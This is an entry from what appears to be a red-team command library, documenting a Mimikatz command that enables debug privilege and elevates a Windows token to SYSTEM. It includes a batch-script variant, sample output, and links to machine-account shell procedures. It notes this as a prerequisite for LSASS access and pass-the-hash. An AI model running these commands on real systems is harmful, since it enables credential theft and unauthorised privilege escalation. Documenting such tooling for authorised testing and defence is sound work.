---
id: new-uuid-for-debug-command
name: Mimikatz Enable Debug Privileges
type: command
executor: cmd
data: 'Mimikatz.exe "privilege::debug" "token::elevate"'
output: |-
  Privilege '20' OK
  Token elevated successfully
created_at: '2023-10-01T00:00:00+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Windows
tags:
  - mimikatz
  - privilege-escalation
verified: true
validated: true
---

# Mimikatz Enable Debug Privileges

## Command

```cmd
Mimikatz.exe "privilege::debug" "token::elevate"
```

## Description

This command enables SeDebugPrivilege (privilege ID 20) required for Mimikatz to access LSASS and perform token manipulation. It is a prerequisite for modules like sekurlsa::pth. Run as administrator on a Windows system.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| privilege::debug | Enables debug privilege for LSASS access | Yes |
| token::elevate | Elevates the current token to system level if possible | Yes |

## Examples

### Basic Usage

```cmd
Mimikatz.exe "privilege::debug" "token::elevate"
```

### Advanced Usage

Run in a batch script for automation:

```cmd
@echo off
Mimikatz.exe "privilege::debug" "token::elevate" exit
```

## Expected Output

Privilege '20' OK

Token ID : 0;5434326
Elevated to System

Description of what output to expect when the command runs successfully.

## Related

- [[commands/Mimikatz-Spawn-a-Shell-as-an-AD-Machine-Account]]
- [[procedures/Execute-Commands-with-an-Active-Directory-Machine-Account]]
